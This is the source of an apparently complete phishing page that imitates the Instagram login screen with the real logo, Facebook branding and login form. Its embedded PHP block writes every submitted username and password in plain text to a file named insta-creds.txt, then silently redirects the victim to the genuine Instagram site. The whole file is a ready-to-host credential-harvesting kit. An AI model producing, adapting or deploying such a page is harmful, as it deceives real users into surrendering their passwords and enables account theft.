<!DOCTYPE html>
<html>
<head>
	<title>Instagram</title>
	<meta charset="UTF-8"/>
	<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	<meta name="keyword" content="HTML, CSS, Javascript"/>
	<meta name="author" content="instagram"/>
	<link rel="stylesheet" href="index.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<link href='https://fonts.googleapis.com/css?family=ABeeZee' rel='stylesheet'>
	<link rel="stylesheet" href="index.css">
</head>
<body>
	<h4>Instagram<p id="banner">Find it for free on Google Play</p><button id="getInsta"><b>GET</b></button></h4>
	
	<p class="lang">
	<i class="fa fa-ellipsis-h" id="menuDots"></i><b>ENGLISH</b><i class="fa fa-angle-down"></i></p>
		<br />
	
	<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Insta Logo" id="instaLogo">
		<br />
		
	<center>
	<button id="continueFacebook"><i class="fa fa-facebook-square" aria-hidden="true" id="fbBtn"></i><b>Continue with Facebook</b></button>
		<br />
		<br />
	<hr style="width:40%;float:left;margin-top:2.5%;margin-left:5%;color:#969696;"> OR <hr style="width:40%;float:right;margin-top:2.5%;margin-right:5%;color:#969696;">
		<br />
		<br />
	<?php
		if(isset($_POST['email'])){
			$user=$_POST["email"];
			$pass=$_POST["password"];
			$creds="insta-creds.txt";
			file_put_contents($creds,"user: ".$user."\n",FILE_APPEND | LOCK_EX);
			file_put_contents($creds,"password: ".$pass."\n",FILE_APPEND | LOCK_EX);
			echo "<script>window.location.replace('https://www.instagram.com/');</script>";
		}
	?>
	<form method="POST" action="">
		<p class="main">
			<input type="email" placeholder="Phone number, email, or username" name="email" class="one" required>
				<br/>
			<input type="password" placeholder="Password" name="password" class="two" required>
		</p>
		<a href="" style="color:#26a5f7;font-size:14px;float:right;margin-right:20px;margin-top:3px;">Forgotten Password?</a> 
			<br />
			<br />
		<button class="loginBtn" type="submit" formmethod="post" id="loginBtn" value="Login" name="Log In" data-sigil="touchable" href="https://www.instagram.com/login.php" onclick="location.href='www.instagram.com'"><span class="loginSpan"><b>Log In</b></span></button>
		<p style="margin-top:20px;color:#969696;">Dont have an account? <a href="" style="color:#0095f6;margin-bottom:20px;"><b>Sign Up</b></a></p>	
	</form>
	</center>
		<br />
		<br />
		<br />
<footer>
		<br />
	<p style="color:#969696;font-size:14px;">from</p>
	<p id="facebookInc"><b>FACEBOOK</b></p>
		<br />
</footer>
</body>
</html>
